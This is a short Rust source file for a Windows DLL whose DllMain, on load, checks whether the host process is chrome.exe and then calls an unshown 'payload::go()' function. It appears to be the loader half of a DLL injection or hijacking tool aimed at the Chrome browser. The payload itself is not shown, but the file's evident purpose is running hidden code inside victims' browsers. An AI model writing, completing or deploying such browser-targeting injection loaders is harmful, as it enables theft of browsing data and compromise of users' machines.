#![no_main]

use windows::Win32::System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};

type BOOL = i32;
pub const TRUE: BOOL = 1;

#[unsafe(export_name = "DllMain")]
extern "system" fn dll_main(_: usize, dw_reason: u32, _: usize) -> BOOL {
    match dw_reason {
        DLL_PROCESS_ATTACH => {
            // Check executable
            if let Ok(exe_path) = std::env::current_exe() {
                if let Some(file_name) = exe_path.file_name() {
                    if let Some(name_str) = file_name.to_str() {
                        if name_str.eq_ignore_ascii_case("chrome.exe") {
                            // Execute payload
                            payload::go();
                        }
                    }
                }
            }
        }
        DLL_PROCESS_DETACH => {}
        _ => {}
    }

    TRUE
}
